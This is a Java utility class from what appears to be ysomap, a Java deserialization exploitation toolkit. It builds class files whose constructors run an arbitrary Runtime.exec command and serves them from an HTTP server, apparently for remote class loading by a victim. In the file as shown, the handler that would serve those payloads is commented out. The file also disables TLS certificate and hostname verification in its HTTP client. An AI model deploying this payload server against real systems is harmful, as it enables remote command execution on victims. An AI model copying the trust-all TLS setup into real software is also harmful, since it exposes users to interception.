package ysomap.core.util;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import okhttp3.*;
import ysomap.common.util.Logger;

import javax.net.ssl.*;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.List;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
public class HTTPHelper {

    private static OkHttpClient client = null;


    public static HttpServer makeSimpleHTTPServer(int port, Map<String, HttpHandler> paths) throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        for(Map.Entry<String, HttpHandler> path: paths.entrySet()){
            server.createContext(path.getKey(), path.getValue());
        }
        server.setExecutor(null);
        return server;
    }

    public static HttpHandler makeHTTPHandler(String filename, String body) throws Exception {
        HttpHandler handler = null;
        if(body.startsWith("code:")){
            body = body.substring(5);
        }else{
            body = PayloadHelper.makeRuntimeExecPayload(body);
        }

        byte[] obj = ClassFiles.makeClassWithDefaultConstructor(
                filename.replace(".class",""), body);

//        if(filename.endsWith(".class")){
//            handler = new PayloadHandler(obj);
//        }else if(filename.endsWith(".jar")){
//            handler = new PayloadHandler(
//                    ClassFiles.makeJarFile(filename, obj));
//        }
        return handler;
    }


    public static class PayloadHandler implements HttpHandler {

        private byte[] obj;

        public PayloadHandler(byte[] obj) throws Exception {
            this.obj = obj;
        }

        @Override
        public void handle(HttpExchange exchange) throws IOException {
            Logger.normal("    Have request from "+exchange.getRemoteAddress());
            Logger.normal("    Get request <"+exchange.getRequestMethod()+"> "+exchange.getRequestURI());
            exchange.sendResponseHeaders(200, obj.length);
            OutputStream os = exchange.getResponseBody();
            os.write(obj);
            os.close();
            Logger.normal("    return payload and close\n");
        }
    }

    public static Response post(String url, RequestBody body, Headers headers, boolean vv){
        Request request = new Request.Builder()
                    .url(url)
                    .headers(headers)
                    .post(body)
                    .build();

//        Proxy proxy = new Proxy(Proxy.Type.HTTP,
//                new InetSocketAddress("127.0.0.1", 7890));
//
//        client = new OkHttpClient.Builder()
//                .proxy(proxy)
//                .build();
        try(Response response = client.newCall(request).execute()){
            log(response, vv);
            return response;
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }

    public static Response get(String url, Headers headers, boolean vv){
        if(headers == null){
            headers =  new Headers.Builder().build();
        }
        Request request = new Request.Builder()
                .url(url)
                .headers(headers)
                .build();
        try(Response response = client.newCall(request).execute()){
            log(response, vv);
            return response;
        } catch (IOException e) {
            return null;
        }
    }

    public static void log(Response response, boolean vv) throws IOException {
        Logger.normal("Status Code: "+response.code());
        Logger.normal("Response Headers:");
        Map<String, List<String>> responseHeaders = response.headers().toMultimap();
        for(Map.Entry entry:responseHeaders.entrySet()){
            Logger.normal(entry.getKey()+":"+entry.getValue());
        }
        if(vv){
            Logger.normal("Response Body:");
            Logger.normal(response.body().string());
        }
    }

    static {
        try {
            // Create a trust manager that does not validate certificate chains
            final TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        @Override
                        public void checkClientTrusted(java.security.cert.X509Certificate[] chain,
                                                       String authType) throws CertificateException {
                        }

                        @Override
                        public void checkServerTrusted(java.security.cert.X509Certificate[] chain,
                                                       String authType) throws CertificateException {
                        }

                        @Override
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return new X509Certificate[0];
                        }
                    }
            };

            // Install the all-trusting trust manager
            final SSLContext sslContext = SSLContext.getInstance("SSL");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
            // Create an ssl socket factory with our all-trusting manager
            final SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();
            client =  new OkHttpClient.Builder()
                    .sslSocketFactory(sslSocketFactory, (X509TrustManager) trustAllCerts[0])
                    .hostnameVerifier(new HostnameVerifier() {
                        @Override
                        public boolean verify(String hostname, SSLSession session) {
                            return true;
                        }
                    })
                    .connectTimeout(3, TimeUnit.SECONDS)
                    .build();

        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
